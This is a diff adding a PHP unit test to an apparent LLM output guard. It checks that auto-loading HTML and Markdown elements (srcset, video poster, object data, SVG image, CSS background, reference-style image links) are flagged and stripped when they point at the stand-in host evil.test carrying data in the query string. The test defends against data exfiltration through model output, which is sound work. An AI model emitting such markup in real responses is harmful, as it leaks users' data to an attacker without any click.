@@ -136,6 +136,43 @@ class LlmOutputGuardTest extends TestCase
         $this->assertFalse(AiGuard::scanOutput('![dot](data:image/png;base64,iVBORw0KGgo=)')['detected']);
     }
 
+    public function test_every_element_a_browser_fetches_on_sight_is_inspected(): void
+    {
+        config()->set('ai-guard.llm_guard.allowed_domains', ['acme.test']);
+        $this->refreshAiGuard();
+
+        $data = self::EXFIL_DATA;
+
+        // Only <img src> and inline Markdown images were looked at; each of these loads
+        // its URL with no click and carried the data out unflagged
+        foreach ([
+            "<img srcset=\"https://evil.test/a.png?d={$data} 1x\">",
+            "<img src=\"\" srcset=\"https://evil.test/a.png?d={$data}\">",
+            "<picture><source srcset=\"https://evil.test/a.png?d={$data}\"><img src=\"/a.png\"></picture>",
+            "<video poster=\"https://evil.test/p.png?d={$data}\"></video>",
+            "<object data=\"https://evil.test/o?d={$data}\"></object>",
+            "<svg><image href=\"https://evil.test/i.png?d={$data}\"/></svg>",
+            "<div style=\"background:url(https://evil.test/b.png?d={$data})\">x</div>",
+            "![chart][1]\n\n[1]: https://evil.test/r.png?d={$data}",
+            "[click][ref]\n\n[ref]: https://evil.test/l?d={$data}",
+            "<a href=\"https://evil.test/l?d={$data}\">click</a>",
+        ] as $output) {
+            $result = AiGuard::scanOutput($output);
+
+            $this->assertTrue($result['detected'], $output);
+            $this->assertStringNotContainsString($data, $result['sanitized'], $output);
+        }
+
+        // Same-site and allowed-host fetches stay as they were
+        foreach ([
+            '<img src="https://cdn.acme.test/a.png" srcset="https://cdn.acme.test/a-2x.png 2x">',
+            "![logo][home]\n\n[home]: /img/logo.png",
+            '<div style="background:url(/img/bg.png)">x</div>',
+        ] as $output) {
+            $this->assertFalse(AiGuard::scanOutput($output)['detected'], $output);
+        }
+    }
+
     // -------------------------------------------------------------------------
     // Secrets and downstream-agent instructions
     // -------------------------------------------------------------------------
